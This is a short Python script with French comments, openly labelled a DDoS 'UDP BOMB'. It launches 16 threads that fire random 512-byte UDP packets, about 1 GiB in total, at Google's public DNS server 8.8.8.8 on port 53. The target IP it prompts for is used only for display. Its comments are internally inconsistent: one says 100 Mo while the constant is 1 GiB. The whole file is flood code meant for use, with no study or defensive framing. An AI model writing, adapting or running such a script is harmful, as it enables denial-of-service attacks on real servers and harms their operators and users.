import socket
import threading
import time
import random

GOAL_BYTES = 1 * 1024 * 1024 * 1024  # 100 Mo pour limiter la charge (tu peux ajuster)
THREADS = 16
RATE_LIMIT_MBPS = 2  # Limite par thread (Mo/s)
DNS_SERVER = "8.8.8.8"
DNS_PORT = 53
PACKET_SIZE = 512  # paquets plus petits pour éviter saturer

def udp_blast(target_ip, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(PACKET_SIZE)
    bytes_sent = 0
    start_time = time.time()
    rate_limit_bytes_per_sec = RATE_LIMIT_MBPS * 1024 * 1024

    while bytes_sent < GOAL_BYTES // THREADS:
        try:
            elapsed = time.time() - start_time
            current_rate = bytes_sent / elapsed if elapsed > 0 else 0

            if current_rate < rate_limit_bytes_per_sec:
                sock.sendto(data, (DNS_SERVER, DNS_PORT))
                bytes_sent += PACKET_SIZE
            else:
                time.sleep(0.05)  # petite pause pour soulager la connexion
        except Exception as e:
            print(f"[Thread {thread_id}] ❌ Erreur : {e}")
            break

    total_time = time.time() - start_time
    mb_sent = bytes_sent / (1024 * 1024)
    print(f"[Thread {thread_id}] ✅ Terminé — {mb_sent:.2f} Mo envoyés en {total_time:.2f}s.")

def ddos_1go_burst():
    target_ip = input("IP cible (sera utilisé uniquement pour affichage) : ")
    print(f"\n⚡ UDP BOMB via DNS {DNS_SERVER}:53 (limité pour éviter saturation) ⚡")
    print(f"🚀 Envoi d'environ {GOAL_BYTES / (1024*1024)} Mo avec {THREADS} threads, limité à {RATE_LIMIT_MBPS} Mo/s par thread...")

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=udp_blast, args=(target_ip, i+1))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("\n🎯 Test terminé.")

def ddos_menu():
    ddos_1go_burst()
